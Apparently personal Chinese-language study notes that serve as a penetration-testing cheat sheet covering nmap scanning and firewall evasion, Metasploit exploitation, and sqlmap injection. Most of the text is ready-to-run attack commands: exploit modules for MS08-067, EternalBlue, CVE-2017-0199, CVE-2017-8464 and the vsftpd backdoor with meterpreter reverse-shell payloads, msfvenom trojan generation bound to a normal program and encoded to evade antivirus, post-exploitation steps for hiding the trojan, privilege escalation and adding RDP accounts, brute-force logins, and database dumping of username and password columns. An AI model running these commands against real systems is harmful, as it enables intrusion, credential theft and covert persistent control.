#### namp

##### **下载**

> https://nmap.org/download.html 下载安装包
>
> ./configure &&make&&make install

##### 重要参数 

> <img src="C:\Users\86184\AppData\Roaming\Typora\typora-user-images\image-20210414110942271.png" alt="image-20210414110942271" style="zoom: 80%;" />

##### 特殊扫描

> **无Ping扫描**
>
> > nmap -P0 172.21.230.14/24
>
> **SYN扫描**
>
> > nmap -PS 172.21.230.14/24
>
> **ICMP扫描**
>
> > -PE, -PP , -PM
> >
> > ICMP 回声应答扫描
> >
> > ICMP 时间戳扫描		确定主机是否在线
> >
> > ICMP 地址掩码扫描    可以很好传统防火墙
>
> **ACK扫描**
>
> > 有利于绕过封锁SYN报文的主机
> >
> > nmap -PA IP
>
> **UDP扫描**
>
> > 用于查找开放udp端口的主机
> >
> > namp -PU 172.21.22.2
>
> **ARP 扫描**
>
> > 更可靠更迅速
> >
> > nmap -PR 172.21.2.2
>
> **快速扫描**
>
> > nmap -T4 172.21.22.2
>
> **常见端口扫描**
>
> > nmap -F 172.21.22.2
>
> **乱序端口扫描(防止被防火墙识别)**
>
> > nmap -r 172.21.22.2
>
> **隐匿扫描(更容易躲过防火墙)**
>
> > -sN, -sF, -sX, -sN
> >
> > nmap -sN 172.21.22.2

##### **指纹识别**

> **全端口扫描包括服务器版本**
>
> > nmap -sV -alllports 172.21.22.2   
>
> **操作系统版本推测**
>
> > nmap -O --osscan-guess 172.21.1.1

##### **逃逸防火墙**

> **报文分段**
>
> > **容易逃过包过滤**
> >
> > nmap -f  172.21.1.1
>
> **指定最大传输单元**
>
> > nmap --mtu 16 172.21.1.1
>
> **隐蔽扫描(隐藏IP)**
>
> > nmap -D RND:16(随机数字) 172.21.1.1
>
> **源地址欺骗**
>
> > nmap -sI www.baidu.com:80 172.21.1.1
>
> **源端口欺骗**
>
> > nmap --source-port 53 172.21.204.107
>
> **MAC 地址欺骗**
>
> > nmap -sT -PN --spoof-mac 0 172.21.204.107
>
> **附加随机数据(真实有效)**
>
> > **参杂些随机数据来影响防火墙的判断**
> >
> > nmap --data-length 172.21.204.107
>

##### **信息收集**

> **IP信息收集**
>
> > **可查看注册信息***
> >
> > nmap --script ip-geolocation-* 172.21.1.1
>
> **whois信息收集**
>
> > **可以收集域名所有者的信息**
> >
> > nmap --script whois www.baidu.com
>
> **IP反差查***
>
> > **主要了解是否绑定其他域名**
> >
> > nmap -sn --script hostmap-ip2hosts www.baidu.com

##### **漏洞扫描**

> **系统漏洞扫描**
>
> > ~~nmap --script smb-check-vulns.nse -p445 172.21.204.107~~ 
> >
> > nmap --script smb-vuln-*.nse  -p445 172.21.204.107

##### **渗透测试**

> **审计FTP**
>
> > nmap --script ftp-brute --script-args userdb=用户名字典,passdb=密码字典 -p 21 172.21.204.107
>
> **审计wordpress**
>
> > nmap -p80 --script http-wordpress-brute --script-args userdb=用户名字典,passdb=密码字典  [ threads=100(线程数)] 172.21.204.107 
>
> **审计数据库**
>
> > nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=test --script-args userdb=用户名字典,passdb=密码字典  172.21.204.107
>

##### 安装nse脚本

> cd /usr/share/nmap/script
>
> git clone https://github.com/vulnersCom/nmap-vulners.git
>
> git clone https://github.com/scipag/vulscan.git

#### Metasploit

##### 	MS08-067

> **全称：Windows Server 服务RPC请求缓存区溢出漏洞**
>
> 系统：Winxp, Win2000, Win2003
>
> > use windows/smb/ms08_067_netapi
> >
> > set RHOSTS IP  #设置目标主机IP
> >
> > set payload windows/meterpreter/reverse_tcp  #设置payload建立连接
> >
> > set TARGET ID	#设置target选项
> >
> > exploit  #攻击

##### vsftpd漏洞

> **vsftpd 版本要求：v2.3.4lp**
>
> > use exploit/unix/ftp/vsftpd_234_backdoor
> >
> > set RHOSTS IP
> >
> > run

##### CVE-2017-0199

> **通过发送恶意文档来执行有效载荷的office文档**
>
> > use exploit/windows/misc/hta_server
> >
> > run
> >
> > 获取链接后执行 use exploit/windows/fileformat/office_word_hta
> >
> > set TARGETURI 获取的local ip
> >
> > set FILENAME msf.doc  (默认设置)
> >
> > set LPORT 5555 	(设置一个没有占用的端口)l'p
> >
> > run

##### CVE-2017-8464

> **攻击者给受害者 一个恶意文件,文件可存放再移动磁盘或远程共享文件夹当用户打开文件时被攻击**
>
> > set PAYLOAD windows/meterpreter/reverse_tcp
> >
> > use exploit/windows/fileformat/cve_2017_8464_lnk_rce
> >
> > set LHOST 目标IP
> >
> > run
> >
> > 生成LNK文件，将文件复制到U盘或其他盘，如果打开盘符中招
> >
> > 设置监听：
> >
> > > use multi/handler
> > >
> > >  set paylaod windows/meterpreter/reverse_tcp
> > >
> > > set LHOST 目标IP
> > >
> > > run

##### 永恒之蓝

> msfconsole
>
> search MS17-010
>
> use exploit/windows/smb/ms17_010_eternalblue
>
> set payload windows/x64/meterpreter/reverse_tcp
>
> set RHOSTS 192.168.1.143    //目标靶机ip
>
> set LHOST 192.168.1.142    //本机IP
>
> exploit

##### CVE-2017-7494

> **服务器版的永恒之蓝**
>
> > use exploit/linux/samba/is_known_pipename
> >
> > set RHOST 目标IP
> >
> > set targets 合适targetss
> >
> > run

##### 木马后门

> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.64.7 LPORT=1234 -f exe >/root/1.exe
>
> -p 参数指定一个payload ,	-f 参数指定生成的文件格式、 其中需要设置本地监听的IP和端口号

> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.64.7 LPORT=1234 -x /root/cmd.exe -e x86/shikata_ga_nai -i 5 -f exe -o /root/test.exe
>
> -x 参数选项绑定一个正常程序，可达到免杀， -e 参数指定编码方式 , -i  参数指定编码次数,-o参数保存到指定位置

> **监听**：
>
> > use exploit/multi/handler
> >
> > set payload windows/x64/meterpreter/reverse_tcp
> >
> > set lhost 192.168.64.7
> >
> > set lport 1234
> >
> > run

##### 后渗透应用

> **为了方便控制主机**
>
> > shell 	 切换到目标主机，前提已经被控制
> >
> > exit 		切换回Meterpreter
>
> **防止木马发现**
>
> > 可以把木马迁移到系统进程中
> >
> > ps 查看目标所有进程
> >
> > run post/windows/manage/migrate	切换到一个进程中
>
> **提权**
>
> > getuid	查看当前用户权限
> >
> > getsystem	获取系统最高权限
> >
> > 如果此命令无效可以使用 run post/windows/gather/enum_applications	查看系统所安装的补丁
> >
> > 如果有遗漏的补丁就可以进行利用，从而获得最高权限
>
> **隧道代理技术**
>
> > portfwd add -1 端口号 -r 反弹IP -p 反弹端口号
> >
> > portfwd add -1 1234 -r 192.168.64.7 -p 3389
> >
> > rdesktop 127.0.0.1:1234	使用rdesktop命令连接本地1234端口即可连接目标3389端口
> >
> > 也可以使用getgui命令添加账号密码
> >
> > run getgui -u admin -p admin
> >
> > run getgui -e -f 8888 	将目标的3389映射到本地8888
> >
> > rdesktop 127.0.0.1:8888	使用rdesktop进行连接

##### FTP密码审计

> use auxiliary/scanner/ftp/ftp_login
>
> set RHOSTS 192.168.64.7
>
> set THREADS 100   设置线程数
>
> set USER_FIFE 	  用户名字典
>
> set PASS_FIFE		密码字典
>
> run

##### SSH审计

> use auxiliary/scanner/ssh/ssh_login
>
> set RHOSTS 192.168.64.7
>
> set THREADS 100   设置线程数
>
> set USER_FIFE 	  用户名字典
>
> set PASS_FIFE		密码字典
>
> run

#####  网站目录扫描

>  use auxiliary/scanner/http/dir_scanner
>
>  set RHOSTS 192.168.64.7
>
>  set PATH /cms/ 	网站根目录
>
> set THREADS 50
>
> exploit	(如果有字典可以设置字典,默认使用自带的字典)

##### 主机发现

> 模块目录：modules/auxiliary/scanner/discovery/目录下
>
> **扫描活跃主机:**
>
> > use auxiliary/scanner/discovery/arp_sweep
> >
> >  set RHOSTS 192.168.64.0/24
> >
> > set ThREADS 50
> >
> > exploit

##### 服务查点

> **TELNET**
>
> > use auxiliary/scanner/telnet/telnet_version
> >
> > set RHOSTS 192.168.64.0/24
> >
> > set THREADS 50
> >
> > exploit
>
> **SSH**
>
> > use auxiliary/scanner/ssh/ssh_version
> >
> > set RHOSTS 192.168.64.0/24
> >
> > set THREADS 50
> >
> > exploit
>
> **MSSL 服务查点**
>
> > use auxiliary/scanner/mssql/mssql_ping
> >
> > set RHOSTS 192.168.64.0/24
> >
> > set THREADS 50
> >
> > exploit

##### 基础命令

| 命令              |                     解释                      |
| :---------------- | :-------------------------------------------: |
| background        |         将Meterpreter 终端隐藏在后台          |
| sessions          | 查看已经成功获取的会话。-i 选项，切入后台会话 |
| shell             |             获取系统的控制台shell             |
| quit              |  关闭当前的额Meterpreter 会话，返回MSF 终端   |
| pwd               |          获取目标主机当前的工作目录           |
| cd                |                   切换目录                    |
| ls                |             查看当前目录下的内容              |
| cat               |                 查看文件内容                  |
| edit              |                   编辑文件                    |
| download          |                   下载文件                    |
| search            |                   搜索文件                    |
| ifconfig/ipconfig |                 查看网卡信息                  |
| route             |            查看路由信息，设置路由             |
| sysinfo           |                 查看系统信息                  |
| getuid            |                获取当前用户id                 |
| ps                |                   查看进程                    |
| getpid            |                 查看当前进程                  |
| migrate           |                   切换进程                    |
| execute           |                   执行文件                    |
| kill              |              终极指定PID 的进程               |
| shutdown          |                     关机                      |
| screenshot        |                   屏幕快照                    |

#### SQLMAP

##### MYSQL注入

###### GET

> sqlmap -u url 	检测注入点
>
> sqlmap -u url --dbs 列出所有数据库名字
>
> sqlmap -u url --current-db 列出当前数据库名字
>
> sqlmap -u url -D "mysql" --tables	指定一个数据库并列出表名
>
> sqlmap -u url -D "mysql" -T  "user" --columns 列出所有的字段名
>
>  sqlmap -u url -D "mysql" -T  "user" -C "username,password" --dump  指定字段名列出内容

###### POST

> 使用bp获得HTTP信息复制保存到本地文件如test.txt
>
> sqlmap -r test.txt

##### ACCESS注入

> sqlmap -u url 	检测注入点
>
> sqlmap -u url --tables 获得数据库所有表		可以选择内置表和线程数Y
>
> sqlmap -u url --columns -T "user"	获取user表中的字段	可以选择内置表和线程数Y
>
> sqlmap -u url --dump -T "user" -C "username,password"	获取信息

##### COOKIE注入

> **使用cookie注入必须把url分为两段，并且leve 必须2以上**
>
> sqlmap -u "http://192.168.64.7/sqli-labs-master/Less-9/" --cookie "id=1" --leve 2
>
> sqlmap -u "http://192.168.64.7/sqli-labs-master/Less-9/" --cookie "id=1" --columns -T "user" --leve 2
>
> ......

